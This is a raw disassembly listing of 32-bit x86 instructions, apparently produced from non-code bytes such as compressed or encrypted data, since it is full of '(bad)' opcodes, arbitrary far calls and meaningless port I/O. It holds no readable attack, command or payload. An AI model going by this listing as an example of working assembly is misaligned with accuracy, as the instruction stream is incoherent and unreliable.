  4177ff:	test   BYTE PTR [edx+ebx*8-0x146646a9],dh
  417806:	sbb    edx,DWORD PTR [esi]
  417808:	pop    ebx
  417809:	fistp  DWORD PTR [ebx-0x3ed6a7df]
  41780f:	jne    0x4177fe
  417811:	out    0xa7,eax
  417813:	test   eax,0xa3941b2f
  417818:	arpl   di,di
  41781a:	retf   
  41781b:	sbb    eax,ebp
  41781d:	jle    0x417871
  41781f:	adc    esi,DWORD PTR [esi-0x56cdbeb7]
  417825:	rol    BYTE PTR [esi+0x33],0x13
  417829:	adc    ebx,esi
  41782b:	add    eax,esp
  41782d:	xchg   BYTE PTR [edx],ah
  41782f:	mov    al,0xe1
  417831:	sahf   
  417832:	ins    BYTE PTR es:[edi],dx
  417833:	jnp    0x41788c
  417835:	iret   
  417836:	and    al,0x5a
  417838:	push   ebx
  417839:	out    dx,eax
  41783a:	xor    BYTE PTR [ecx+0x7d],ah
  41783d:	nop
  41783e:	cmp    BYTE PTR ds:0xcd3bdc7a,cl
  417844:	enter  0xf27f,0x61
  417848:	mov    ebx,0x9d13169d
  41784d:	dec    edx
  41784e:	or     DWORD PTR ds:0xa6457092,0x255aa33f
  417858:	sbb    edi,0xf520c17e
  41785e:	add    esi,DWORD PTR [eax+0x12acc6af]
  417864:	cmp    al,0x2f
  417866:	pop    DWORD PTR [ebx]
  417868:	or     BYTE PTR [edx],ch
  41786a:	push   edi
  41786b:	inc    edi
  41786c:	mov    ds:0x6da9908a,al
  417871:	enter  0xb49f,0x2b
  417875:	mov    edi,0x410e6b0a
  41787a:	clc    
  41787b:	or     DWORD PTR [ecx-0x69],esp
  41787e:	lods   al,BYTE PTR ds:[esi]
  41787f:	push   edx
  417880:	cmp    al,0xe9
  417882:	sbb    BYTE PTR [ecx-0x4c6d7f20],dh
  417888:	clc    
  417889:	clc    
  41788a:	push   ebp
  41788b:	std    
  41788c:	adc    bl,BYTE PTR [edx+0x5b5b6af0]
  417892:	mov    edx,0x7d6d820f
  417897:	int3   
  417898:	arpl   sp,cx
  41789a:	fadd   DWORD PTR [esi]
  41789c:	shl    BYTE PTR [edx],1
  41789e:	mov    edi,0xfdd3829
  4178a3:	mov    ecx,0x187e00fa
  4178a8:	rcr    BYTE PTR [esi+0x6eda130f],0x57
  4178af:	fbstp  TBYTE PTR [edi+0x51750abb]
  4178b5:	xor    eax,0xc9cc9c29
  4178ba:	jb     0x417886
  4178bc:	ja     0x417933
  4178be:	fld    DWORD PTR [ebx+eax*8+0x78]
  4178c2:	xchg   esp,eax
  4178c3:	jmp    0x4178e9
  4178c5:	sub    eax,0x659b9faf
  4178ca:	out    dx,al
  4178cb:	or     eax,0x3d827713
  4178d0:	fimul  WORD PTR [edx-0x4]
  4178d3:	jne    0x4178ac
  4178d5:	jle    0x4178c2
  4178d7:	inc    edi
  4178d8:	js     0x417885
  4178da:	pop    ecx
  4178db:	(bad)  
  4178dc:	adc    DWORD PTR [ebp+0x5c],esi
  4178df:	repnz shl BYTE PTR [ebx],cl
  4178e2:	arpl   WORD PTR [ecx-0x636e164f],ax
  4178e8:	inc    edx
  4178e9:	xchg   ebx,eax
  4178ea:	mov    ds:0xb97ff091,al
  4178ef:	sahf   
  4178f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4178f1:	pushf  
  4178f2:	adc    eax,0x89ea9295
  4178f7:	lds    ebp,FWORD PTR [ebx+edi*8]
  4178fa:	dec    edx
  4178fb:	sub    edx,esp
  4178fd:	rcr    DWORD PTR [edx-0x5e],0x15
  417901:	call   0xe23a:0xf70cbab8
  417908:	or     edi,edi
  41790a:	mov    edx,0x2873d3d6
  41790f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417910:	pop    ebp
  417911:	hlt    
  417912:	clc    
  417913:	and    al,0xe0
  417915:	xlat   BYTE PTR ds:[ebx]
  417916:	mov    edi,0x9885be98
  41791b:	add    esi,DWORD PTR [edi-0x20030fab]
  417921:	push   edi
  417922:	or     eax,ebp
  417924:	inc    esi
  417925:	sub    esp,esi
  417927:	jb     0x417971
  417929:	push   ebx
  41792a:	xchg   BYTE PTR [ecx],bl
  41792c:	inc    esp
  41792d:	mov    edx,0xa72aea0a
  417932:	inc    esi
  417933:	mov    dl,0xd7
  417935:	into   
  417936:	push   ecx
  417937:	adc    eax,0x1ebd4c09
  41793c:	lahf   
  41793d:	xchg   DWORD PTR [ebx-0x14],esp
  417940:	xor    DWORD PTR [esi],ecx
  417942:	ds sub eax,0x8daef6e2
  417948:	push   ds
  417949:	jbe    0x4178fc
  41794b:	mov    esi,0x13efc08a
  417950:	jno    0x417996
  417952:	outs   dx,BYTE PTR ds:[esi]
  417953:	sub    esp,esi
  417955:	es cmp bl,0xc5
  417959:	jg     0x417946
  41795b:	mov    esi,DWORD PTR ds:0xc7f1aa5d
  417961:	xchg   esp,eax
  417962:	mov    BYTE PTR [edx+0x39],ch
  417965:	ret    0x8b9c
  417968:	jmp    0x11a9:0xcaef956a
  41796f:	iret   
  417970:	mov    ecx,0x7a7cf995
  417975:	mov    ebx,0x9ff18e53
  41797a:	faddp  st(5),st
  41797c:	lds    eax,FWORD PTR [ebx]
  41797e:	add    ebx,ecx
  417980:	leave  
  417981:	lods   al,BYTE PTR ds:[esi]
  417982:	add    eax,0x81591c32
  417987:	fimul  WORD PTR [edi-0x7a914462]
  41798d:	imul   esi,DWORD PTR [ecx+edi*8],0x2f
  417991:	dec    ebp
  417992:	test   eax,0x51f674a9
  417997:	adc    ah,dl
  417999:	ret    
  41799a:	inc    ebx
  41799b:	jne    0x417933
  41799d:	ins    BYTE PTR es:[edi],dx
  41799e:	je     0x417984
  4179a0:	test   BYTE PTR [esi],cl
  4179a2:	mov    cs,WORD PTR [edi]
  4179a4:	fsub   st,st(7)
  4179a6:	mov    DWORD PTR [ecx+esi*2],ebx
  4179a9:	mov    bh,dh
  4179ab:	test   al,0xd0
  4179ad:	jb     0x417a05
  4179af:	dec    edi
  4179b0:	xchg   BYTE PTR [ebx],dl
  4179b2:	dec    BYTE PTR [ebx]
  4179b4:	fs int3 
  4179b6:	mov    ch,BYTE PTR [ecx]
  4179b8:	or     BYTE PTR [eax+edi*1+0x0],bh
  4179bc:	xchg   esi,eax
  4179bd:	adc    al,0x86
  4179bf:	push   ebx
  4179c0:	sub    al,ah
  4179c2:	and    BYTE PTR [esi+0x14966d6f],bh
  4179c8:	sti    
  4179c9:	inc    DWORD PTR [ecx-0x5a]
  4179cc:	mov    ecx,0x4b5fed01
  4179d1:	daa    
  4179d2:	push   edx
  4179d3:	xchg   ebx,eax
  4179d4:	xchg   DWORD PTR [eax+0xeb36858],esi
  4179da:	(bad)  
  4179db:	shl    dl,1
  4179dd:	ins    BYTE PTR es:[edi],dx
  4179de:	mov    gs,WORD PTR [esi-0x7d78a78f]
  4179e4:	scas   eax,DWORD PTR es:[edi]
  4179e5:	lods   eax,DWORD PTR ds:[esi]
  4179e6:	pop    ss
  4179e7:	ja     0x4179ed
  4179e9:	add    al,0xa
  4179eb:	out    dx,eax
  4179ec:	mov    ds:0x6ea8c57b,eax
  4179f1:	les    eax,FWORD PTR [edx-0x2b3937dd]
  4179f7:	jl     0x4179d8
  4179f9:	pop    ebp
  4179fa:	push   DWORD PTR [eax+0x3]
  4179fd:	cdq    
  4179fe:	inc    esi
  417a00:	pop    ebp
  417a01:	std    
  417a02:	mov    bh,0x61
  417a04:	rcr    BYTE PTR [edx],0x35
  417a07:	pop    edx
  417a08:	int3   
  417a09:	add    al,0xd6
  417a0b:	inc    ebx
  417a0c:	or     al,0x26
  417a0e:	ja     0x417a48
  417a10:	cwde   
  417a11:	mov    dh,0xff
  417a13:	int    0xa2
  417a15:	mov    esi,0xb801a5cf
  417a1a:	rcl    BYTE PTR [edi],1
  417a1c:	mov    WORD PTR [edx+eiz*4+0x3f7f44d0],gs
  417a23:	shl    BYTE PTR ds:0xe8a2f51b,0x32
  417a2a:	aam    0x6f
  417a2c:	call   0xacb0f453
  417a31:	cmp    al,0x88
  417a33:	pop    es
  417a34:	mov    WORD PTR [edx],ss
  417a36:	das    
  417a37:	push   esi
  417a38:	push   es
  417a39:	push   ss
  417a3a:	dec    edx
  417a3b:	popf   
  417a3c:	in     eax,dx
  417a3d:	test   al,0x28
  417a3f:	out    dx,al
  417a40:	leave  
  417a41:	mov    esp,0x2f9b0f41
  417a46:	sbb    esi,ebx
  417a48:	xrelease mov BYTE PTR [ebx*4+0x5046a6bf],dl
  417a50:	dec    ebp
  417a51:	(bad)  
  417a52:	xlat   BYTE PTR ds:[ebx]
  417a53:	xchg   esi,eax
  417a54:	and    ebp,edi
  417a56:	mov    ch,0x1f
  417a58:	mov    ds:0x25436f63,eax
  417a5d:	jno    0x417a2c
  417a5f:	jge    0x417a12
  417a61:	push   edi
  417a62:	pop    es
  417a63:	xor    eax,0x66eb2456
  417a68:	std    
  417a69:	stos   BYTE PTR es:[edi],al
  417a6a:	push   ds
  417a6b:	mov    ?,WORD PTR es:[ecx-0x19]
  417a6f:	ret    0xc45d
  417a72:	ss (bad) 
  417a74:	repnz inc ebp
  417a76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a77:	call   0x6712:0x640fe0c2
  417a7e:	mov    ebx,0xd90a828c
  417a83:	xchg   ebx,eax
  417a84:	(bad)  
  417a85:	xlat   BYTE PTR ds:[ebx]
  417a86:	xor    bh,bl
  417a88:	in     eax,0x3e
  417a8a:	outs   dx,DWORD PTR ds:[esi]
  417a8b:	lock imul esi
  417a8e:	mov    dl,0xe9
  417a90:	add    DWORD PTR [ebx-0x74],0xc
  417a94:	sub    al,0x10
  417a96:	pop    es
  417a97:	and    DWORD PTR [eax*4-0x26541704],edi
  417a9e:	cmp    eax,0xbbbd7261
  417aa3:	add    ah,BYTE PTR [ebx+0x49]
  417aa6:	push   esi
  417aa7:	cmp    bh,BYTE PTR gs:[ebp+0x56d7a318]
  417aae:	cmp    al,0x8c
  417ab0:	inc    esi
  417ab1:	popw   ss
  417ab3:	sub    eax,0x14259628
  417ab8:	xchg   DWORD PTR [ebp+0x60],ecx
  417abb:	sub    BYTE PTR [ebp+0x28a26c00],ah
  417ac1:	dec    ebx
  417ac2:	add    ah,al
  417ac4:	lock call 0x8eca:0x9e7ff773
  417acc:	aad    0x50
  417ace:	(bad)  
  417acf:	cmovs  eax,DWORD PTR [ebx-0x45]
  417ad3:	mov    ah,ch
  417ad5:	out    dx,al
  417ad6:	xor    bl,BYTE PTR cs:[edx+0x3c]
  417ada:	call   0x8c73:0x3a172c2d
  417ae1:	xlat   BYTE PTR ds:[ebx]
  417ae2:	mov    ds:0x7be13ff7,al
  417ae7:	mov    ebx,0x90ca6490
  417aec:	adc    edx,DWORD PTR [esi+0x7463fd72]
  417af2:	out    dx,al
  417af3:	add    dh,bl
  417af5:	inc    esp
  417af6:	(bad)  
  417af7:	cmc    
  417af8:	dec    eax
  417af9:	ins    BYTE PTR es:[edi],dx
  417afa:	(bad)  
  417afb:	jno    0x417b2d
  417afd:	mov    edx,0xad357352
  417b02:	add    ebp,DWORD PTR [ecx]
  417b04:	push   ebp
  417b05:	dec    ecx
  417b06:	sar    BYTE PTR [ebx+0x51],cl
  417b09:	ret    0x2c41
  417b0c:	jmp    0x417b01
  417b0e:	lds    eax,FWORD PTR [edi+0x5e]
  417b11:	mov    bl,0x73
  417b13:	mov    ch,0x54
  417b15:	into   
  417b16:	lahf   
  417b17:	jns    0x417af4
  417b19:	(bad)  
  417b1b:	mov    WORD PTR [eax-0x58],cs
  417b1e:	cmp    al,0xd2
  417b20:	ret    0x4ba0
  417b23:	cmp    ebx,DWORD PTR [esi]
  417b25:	icebp  
  417b26:	mov    cl,0xd6
  417b28:	and    al,0xf9
  417b2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b2b:	loop   0x417ab4
  417b2d:	sub    edx,DWORD PTR [ebp+ecx*4-0x35]
  417b31:	je     0x417ba5
  417b33:	and    eax,0x50ddd2cb
  417b38:	or     al,dl
  417b3a:	nop    ebp
  417b3d:	add    ebx,DWORD PTR [ecx]
  417b3f:	fst    DWORD PTR ds:0xd0b8b057
  417b45:	sbb    eax,0x6d11a8d5
  417b4a:	mov    edi,0xf28483d7
  417b4f:	mov    ebp,0x7bad4ffa
  417b54:	iret   
  417b55:	cmp    bl,al
  417b57:	rcr    BYTE PTR [ebx+0x3e],1
  417b5a:	xchg   ebx,eax
  417b5b:	mov    cs,eax
  417b5d:	shr    eax,0xcf
  417b60:	adc    BYTE PTR [ebp-0x5db4db6e],0x5b
  417b67:	out    dx,al
  417b68:	pop    ebp
  417b69:	test   BYTE PTR [ebp-0x6035b9ed],ah
  417b6f:	pop    ecx
  417b70:	mov    al,0xb2
  417b72:	mov    ebx,0x98fa2491
  417b77:	mov    ah,0xa9
  417b79:	aaa    
  417b7a:	jp     0x417bc7
  417b7c:	dec    ecx
  417b7d:	imul   edx,DWORD PTR [edx],0xffffffcd
  417b80:	lods   al,BYTE PTR ds:[esi]
  417b81:	jns    0x417bc6
  417b83:	fild   DWORD PTR [edx]
  417b85:	and    esi,DWORD PTR [edi-0x6813d3ad]
  417b8b:	enter  0x9382,0xd7
  417b8f:	jbe    0x417ba0
  417b91:	ss ja  0x417bcc
  417b94:	nop
  417b95:	jp     0x417b74
  417b97:	or     edx,DWORD PTR [eax]
  417b99:	add    eax,0x74d42ac
  417b9e:	push   0x345b34b5
  417ba3:	in     eax,dx
  417ba4:	fwait
  417ba5:	aad    0xfb
  417ba7:	push   cs
  417ba8:	mov    ds:0x65ee363c,al
  417bad:	xchg   edx,eax
  417bae:	ja     0x417b40
  417bb0:	push   0xfac53a65
  417bb5:	cs jbe 0x417c33
  417bb8:	xor    BYTE PTR [eax],dh
  417bba:	out    0x72,eax
  417bbc:	imul   edi,DWORD PTR [ecx],0xa7033b20
  417bc2:	jle    0x417b4d
  417bc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417bc5:	jne    0x417bc4
  417bc7:	fld    TBYTE PTR [eax+edx*8]
  417bca:	aaa    
  417bcb:	push   edi
  417bcc:	lock test DWORD PTR [esi+0x43],ebx
  417bd0:	mov    ebx,0x71f46d0a
  417bd5:	pop    es
  417bd6:	xchg   edi,eax
  417bd7:	call   0x402194c7
  417bdc:	cmc    
  417bdd:	xchg   ecx,eax
  417bde:	fimul  DWORD PTR [eax]
  417be0:	sbb    DWORD PTR [ecx-0x6b50517e],eax
  417be6:	cmp    edx,eax
  417be8:	jo     0x417bd3
  417bea:	fisttp WORD PTR [ebp-0x458bcebc]
  417bf0:	pop    edi
  417bf1:	cwde   
  417bf2:	push   0x66
  417bf4:	enter  0x7bcb,0xed
  417bf8:	js     0x417bce
  417bfa:	fxch   st(4)
  417bfc:	repnz lods al,BYTE PTR ds:[esi]
  417bfe:	adc    esp,DWORD PTR [esi]
  417c00:	push   ss
  417c01:	dec    ecx
  417c03:	and    al,0xcd
  417c05:	push   ebp
  417c06:	popa   
  417c07:	fimul  DWORD PTR [ebp-0x22c9596f]
  417c0d:	mov    bl,BYTE PTR [edi+0x3a]
  417c10:	sahf   
  417c11:	out    dx,eax
  417c12:	in     eax,dx
  417c13:	jne    0x417bf7
  417c15:	jno    0x417c95
  417c17:	jb     0x417bdb
  417c19:	test   eax,0xec3df026
  417c1e:	xor    ecx,edx
  417c20:	aam    0xbc
  417c22:	xchg   edx,eax
  417c23:	sbb    eax,ebp
  417c25:	(bad)  
  417c26:	push   ss
  417c27:	cmp    cl,BYTE PTR ds:0xa7697e92
  417c2d:	inc    esi
  417c2e:	es shr ecx,0xd8
  417c32:	sub    al,0x35
  417c34:	xchg   ebp,eax
  417c35:	jmp    0xb763:0xdd4d40b6
  417c3c:	add    BYTE PTR fs:[edx-0x72d42269],bl
  417c43:	(bad)  
  417c44:	ss pop ss
  417c46:	lock adc BYTE PTR [eax],0x46
  417c4a:	mov    edx,0xe76060a8
  417c4f:	test   DWORD PTR [esi],eax
  417c51:	in     al,dx
  417c52:	hlt    
  417c53:	push   ds
  417c54:	adc    al,0x77
  417c56:	cs mov cl,0xb5
  417c59:	and    cl,BYTE PTR [eax]
  417c5b:	mov    esi,0x82a3df76
  417c60:	xor    ch,BYTE PTR [ebp-0x19]
  417c63:	(bad)  
  417c64:	or     ebp,DWORD PTR [ebx]
  417c66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c67:	call   0x80e0:0xbbdabe9a
  417c6e:	arpl   WORD PTR ds:0xa9671edd,dx
  417c74:	repz sub al,BYTE PTR [ecx+0xb]
  417c78:	and    al,0xef
  417c7a:	arpl   WORD PTR [edi-0x62],bp
  417c7d:	icebp  
  417c7e:	fdiv   DWORD PTR [ecx-0x75ab493b]
  417c84:	lods   al,BYTE PTR ds:[esi]
  417c85:	es pop eax
  417c87:	sbb    esp,eax
  417c89:	xchg   esi,eax
  417c8a:	imul   eax,DWORD PTR [eax],0x4efeb48d
  417c90:	sbb    DWORD PTR [eax],ecx
  417c92:	jo     0x417c67
  417c94:	push   ds
  417c95:	sub    eax,0xec82b2c5
  417c9a:	inc    ecx
  417c9b:	es add esp,ebp
  417c9e:	shl    DWORD PTR ds:0x3a498ebc,cl
  417ca4:	inc    eax
  417ca5:	repz shl edi,1
  417ca8:	je     0x417cea
  417caa:	sbb    DWORD PTR [eax-0x1ca40d68],0xffffffdf
  417cb1:	aam    0xe4
  417cb3:	test   ah,dh
  417cb5:	enter  0x8a43,0xcd
  417cb9:	push   ebp
  417cba:	adc    BYTE PTR [eax],dl
  417cbc:	cmp    ch,BYTE PTR [ecx]
  417cbe:	jno    0x417c7d
  417cc0:	mov    bl,0x97
  417cc2:	lahf   
  417cc3:	int    0xbf
  417cc5:	xor    BYTE PTR [eax+0x72],cl
  417cc8:	stos   BYTE PTR es:[edi],al
  417cc9:	pop    ds
  417cca:	ins    BYTE PTR es:[edi],dx
  417ccb:	xor    BYTE PTR [ecx-0x58],cl
  417cce:	sbb    ebx,ecx
  417cd0:	bound  ecx,QWORD PTR [eax-0x667a712d]
  417cd6:	mov    ds:0x8dbb6615,eax
  417cdb:	xor    esi,DWORD PTR [edx]
  417cdd:	add    BYTE PTR [edx-0x57a93fd8],cl
  417ce3:	sub    eax,0xc3eb87ad
  417ce8:	cmp    al,0xc0
  417cea:	jo     0x417cd7
  417cec:	sbb    esi,DWORD PTR [eax+0x4b00e9c8]
  417cf2:	mov    eax,0xa8d9225b
  417cf7:	jmp    0xe338:0x535aa9c5
  417cfe:	mov    ebx,0x358829cb
  417d03:	inc    eax
  417d04:	fs inc ecx
  417d06:	inc    edx
  417d08:	popf   
  417d09:	ins    DWORD PTR es:[edi],dx
  417d0a:	push   cs
  417d0b:	and    eax,eax
  417d0d:	cmp    al,0x81
  417d0f:	xchg   ebp,eax
  417d10:	arpl   WORD PTR [ecx],bp
  417d12:	call   0x95b06247
  417d17:	jp     0x417ce9
  417d19:	push   eax
  417d1a:	jne    0x417d78
  417d1c:	scas   al,BYTE PTR es:[edi]
  417d1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d1e:	push   esi
  417d1f:	dec    edi
  417d20:	pop    ds
  417d21:	repz dec esp
  417d23:	fistp  WORD PTR [ebp+ebx*4+0x21]
  417d27:	push   edx
  417d28:	add    eax,0x3e524df9
  417d2d:	clc    
  417d2e:	pop    esp
  417d2f:	mov    al,ds:0xc7b0995c
  417d34:	mov    dh,0xe8
  417d36:	cmp    DWORD PTR [ebp-0x27],0xa3a08552
  417d3d:	lock popa 
  417d3f:	cli    
  417d40:	lds    edx,FWORD PTR [ecx+0x61d32a79]
  417d46:	shr    BYTE PTR [eax+0x70],cl
  417d49:	mov    dl,0x5e
  417d4b:	icebp  
  417d4c:	in     eax,dx
  417d4d:	mov    edx,esi
  417d4f:	push   ds
  417d50:	push   es
  417d51:	in     al,0xa7
  417d53:	arpl   WORD PTR [ecx+ebx*4],bp
  417d56:	inc    esi
  417d57:	adc    al,0x68
  417d59:	test   al,0x37
  417d5b:	xor    eax,0xe33f291f
  417d60:	imul   esi
  417d62:	sbb    BYTE PTR [edx],dh
  417d64:	leave  
  417d65:	pop    edi
  417d66:	jle    0x417d42
  417d68:	pusha  
  417d69:	pop    edi
  417d6a:	js     0x417dc1
  417d6c:	jae    0x417d76
  417d6e:	xchg   esp,eax
  417d6f:	lahf   
  417d70:	or     DWORD PTR [edx],ebp
  417d72:	imul   ecx,DWORD PTR [ecx],0x17a1d7f
  417d78:	stos   BYTE PTR es:[edi],al
  417d79:	adc    BYTE PTR [ecx+eiz*2+0x44],dh
  417d7d:	add    edx,edi
  417d7f:	lock inc edx
  417d81:	push   ss
  417d82:	aam    0x9f
  417d84:	jns    0x417d18
  417d86:	call   0xff5a:0x2140e8c7
  417d8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d8e:	loope  0x417dd9
  417d90:	inc    esp
  417d91:	fs stos BYTE PTR es:[edi],al
  417d93:	jbe    0x417d18
  417d95:	enter  0x1e0,0x25
  417d99:	int3   
  417d9a:	or     dl,BYTE PTR [ebx-0x7c]
  417d9d:	ins    DWORD PTR es:[edi],dx
  417d9e:	mov    eax,0x60e6fdbb
  417da3:	test   al,0x5f
  417da5:	ins    BYTE PTR es:[edi],dx
  417da6:	push   ebp
  417da7:	xor    eax,0x3a18b7c
  417dac:	xor    edi,edx
  417dae:	add    BYTE PTR [esi],bl
  417db0:	and    DWORD PTR [ebp-0x46],esi
  417db3:	pop    edi
  417db4:	mov    ecx,0x868260fe
  417db9:	jmp    0x915c:0x528df6b4
  417dc0:	pop    edx
  417dc1:	pop    ebp
  417dc2:	js     0x417dca
  417dc4:	leave  
  417dc5:	in     al,dx
  417dc6:	xchg   esp,eax
  417dc7:	test   al,0x1b
  417dc9:	push   esp
  417dca:	xor    DWORD PTR [ecx-0x73d589c4],esp
  417dd0:	fwait
  417dd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417dd2:	sub    DWORD PTR [edx],esi
  417dd4:	jnp    0x417d97
  417dd6:	mov    esp,0x17d4ac82
  417ddb:	jnp    0x417e1b
  417ddd:	xor    al,0x2d
  417ddf:	(bad)  
  417de0:	xchg   ebp,eax
  417de1:	(bad)  
  417de2:	push   cs
  417de3:	loop   0x417daa
  417de5:	popf   
  417de6:	es ins BYTE PTR es:[edi],dx
  417de8:	nop
  417de9:	outs   dx,BYTE PTR ds:[esi]
  417dea:	sahf   
  417deb:	mov    edx,0x949a1c41
  417df0:	ret    
  417df1:	arpl   cx,bx
  417df3:	inc    esi
  417df4:	scas   eax,DWORD PTR es:[edi]
  417df5:	fldcw  WORD PTR [esp+esi*2+0xb8]
	...
  417fc8:	add    BYTE PTR [esi],cl
  417fca:	pop    esp
  417fcb:	mov    esp,0xffe7fe47
  417fd0:	pop    ebp
  417fd1:	es mov eax,0x84d8fe17
  417fd7:	fnsave [ecx-0x45]
  417fda:	fiadd  DWORD PTR [ecx]
  417fdc:	add    BYTE PTR [eax],ah
  417fde:	pop    es
  417fdf:	add    BYTE PTR [eax],al
  417fe1:	pop    es
  417fe2:	xor    bh,dl
  417fe4:	fcmovnb st,st(4)
  417fe6:	dec    esi
  417fe7:	or     DWORD PTR [ebp-0x69],ecx
  417fea:	ss and al,0xbf
  417fed:	or     bh,BYTE PTR [ebp-0x6a]
  417ff0:	jecxz  0x418051
  417ff2:	add    edx,DWORD PTR [esp+ebx*8-0x2]
  417ff6:	mov    esp,0x9cd53cf7
  417ffb:	arpl   WORD PTR ds:0xc9d2ef5a,dx
  418001:	ja     0x41804a
  418003:	mov    dh,ch
  418005:	addr16 mov gs,ebp
  418008:	test   al,0x42
  41800a:	pop    ebp
  41800b:	inc    BYTE PTR [ecx+0x47f75aa0]
  418011:	jno    0x417ffb
  418013:	push   ds
  418014:	fsubr  QWORD PTR [ebp+eiz*4-0x26]
  418018:	sahf   
  418019:	repz ror DWORD PTR [ebx],1
  41801c:	test   ch,dl
  41801e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41801f:	(bad)  
  418020:	jg     0x417fab
  418022:	test   edi,esi
  418024:	jae    0x41809e
  418026:	call   0xd1d2:0x6ff20bab
  41802d:	sub    eax,0x4e71654b
  418032:	xchg   esp,eax
  418033:	cmp    ebx,DWORD PTR [edi+0x62e64027]
  418039:	stos   DWORD PTR es:[edi],eax
  41803a:	inc    esi
  41803b:	push   ebp
  41803c:	pop    esp
  41803d:	add    esi,DWORD PTR ss:[ebx-0x42]
  418041:	bound  edx,QWORD PTR [edi-0x645be733]
  418047:	retf   
  418048:	data16 fdivr DWORD PTR [eax]
  41804b:	fnstenv [eax-0x9]
  41804e:	push   edx
  41804f:	pop    ds
  418050:	mov    bl,0x6e
  418052:	ds push eax
  418054:	jb     0x4180a6
  418056:	push   0xab30b47e
  41805b:	xchg   BYTE PTR [edi-0x62a534e0],dh
  418061:	out    dx,eax
  418062:	outs   dx,BYTE PTR ds:[esi]
  418063:	push   esp
  418064:	and    edx,DWORD PTR [ebx-0x1671386c]
  41806a:	out    0x77,eax
  41806c:	je     0x41801f
  41806e:	mov    ds:0x234553d,eax
  418073:	push   esi
  418074:	jns    0x41802f
  418076:	adc    ah,ch
  418078:	adc    BYTE PTR [ebp+eiz*2-0x11],ah
  41807c:	dec    esp
  41807d:	jg     0x4180c0
  41807f:	xchg   esi,eax
  418080:	dec    esi
  418081:	sar    DWORD PTR [ecx+0x7b],0x1d
  418085:	sub    dh,BYTE PTR [esi]
  418087:	or     edi,DWORD PTR [ebx]
  418089:	out    dx,al
  41808a:	or     eax,0xad41797b
  41808f:	mov    cl,0x93
  418091:	je     0x41804c
  418093:	loopne 0x41801e
  418095:	adc    eax,0xf5f000c8
  41809a:	inc    edx
  41809b:	xchg   esi,eax
  41809c:	(bad)  [ebx+0x58]
  41809f:	loop   0x418058
  4180a1:	mov    dl,0xdc
  4180a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4180a4:	inc    ecx
  4180a5:	xchg   esp,eax
  4180a6:	std    
  4180a7:	int    0xfb
  4180a9:	es inc edi
  4180ab:	data16 (bad) 
  4180ad:	clc    
  4180ae:	inc    ecx
  4180af:	pop    edi
  4180b0:	popa   
  4180b1:	rcr    DWORD PTR [ebx-0x66],cl
  4180b4:	je     0x4180c2
  4180b6:	(bad)  
  4180b7:	adc    eax,0xd8778415
  4180bc:	mov    cs,WORD PTR [ecx]
  4180be:	or     DWORD PTR [esi],edi
  4180c0:	and    DWORD PTR [eax+0x61df1198],esi
  4180c6:	enter  0x9e9b,0x62
  4180ca:	test   DWORD PTR ds:0x40b0c9e4,esp
  4180d0:	jecxz  0x41812c
  4180d2:	push   0x9a757a0b
  4180d7:	outs   dx,BYTE PTR ds:[esi]
  4180d8:	or     bl,BYTE PTR [ebx+0x6a901d78]
  4180de:	inc    ecx
  4180df:	cmc    
  4180e0:	adc    ch,0x70
  4180e3:	dec    esi
  4180e4:	vpcomub xmm7,xmm5,xmm3,0x10
  4180ea:	push   ds
  4180eb:	or     ah,dh
  4180ed:	cmp    eax,0x1c2a6f3d
  4180f2:	sub    al,0x64
  4180f4:	fadd   QWORD PTR [eax+0x2f]
  4180f7:	call   0x14af:0xd505db7e
  4180fe:	std    
  4180ff:	sub    DWORD PTR [bp+di-0x2],esp
  418103:	xor    DWORD PTR [ecx-0x59b00244],esp
  418109:	imul   eax,DWORD PTR fs:[edx-0x1a],0xffffffdc
  41810e:	xchg   BYTE PTR [ecx],dh
  418110:	shl    BYTE PTR [esi+0x373140b3],0x43
  418117:	cld    
  418118:	cs inc ebx
  41811a:	jg     0x4180a8
  41811c:	fcomp  DWORD PTR [ebx+ebp*8-0x5a]
  418120:	pop    ebx
  418121:	add    bh,BYTE PTR [eax]
  418123:	xchg   ecx,eax
  418124:	or     al,0xd4
  418126:	fimul  WORD PTR [ecx-0x69]
  418129:	pop    esp
  41812a:	retf   0xe650
  41812d:	arpl   di,bp
  41812f:	sbb    BYTE PTR [ecx-0x7b],0xa8
  418133:	hlt    
  418134:	fld    DWORD PTR [ebx+eiz*8-0x5a51ad49]
  41813b:	iret   
  41813c:	aam    0xd8
  41813e:	stc    
  41813f:	lock pop ebp
  418141:	imul   eax,esi,0x6f
  418144:	arpl   WORD PTR [ecx-0x3ed11d14],bp
  41814a:	out    dx,eax
  41814b:	jecxz  0x4181ca
  41814d:	mov    bl,0x28
  41814f:	mov    BYTE PTR [esi],al
  418151:	bound  ecx,QWORD PTR [edx+0x3535c99c]
  418157:	xrelease xchg BYTE PTR [edi-0xdb46a47],dh
  41815e:	ins    DWORD PTR es:[edi],dx
  41815f:	in     eax,0x12
  418161:	sbb    edx,eax
  418163:	mov    fs,WORD PTR [eax]
  418165:	adc    edi,DWORD PTR [ecx+0x3f]
  418168:	das    
  418169:	lock in al,dx
  41816b:	stos   BYTE PTR es:[edi],al
  41816c:	sbb    DWORD PTR [edx+0x7ec1fed0],esi
  418172:	aas    
  418173:	ins    BYTE PTR es:[edi],dx
  418174:	aaa    
  418175:	pop    ss
  418176:	push   ecx
  418177:	gs repz and eax,0x4eae56d5
  41817e:	call   0x3624:0x931bfc79
  418185:	std    
  418186:	pop    eax
  418187:	mov    dl,0x60
  418189:	aas    
  41818a:	ss stos DWORD PTR es:[edi],eax
  41818c:	outs   dx,DWORD PTR ds:[esi]
  41818d:	loopne 0x4181e1
  41818f:	add    al,0x34
  418191:	sbb    ch,ah
  418193:	xor    ecx,0xffffff80
  418196:	cmpxchg BYTE PTR [edx+ecx*8-0x50fb463e],bh
  41819e:	jecxz  0x4181dc
  4181a0:	dec    ecx
  4181a1:	sub    dl,BYTE PTR [ebp-0x77b950ab]
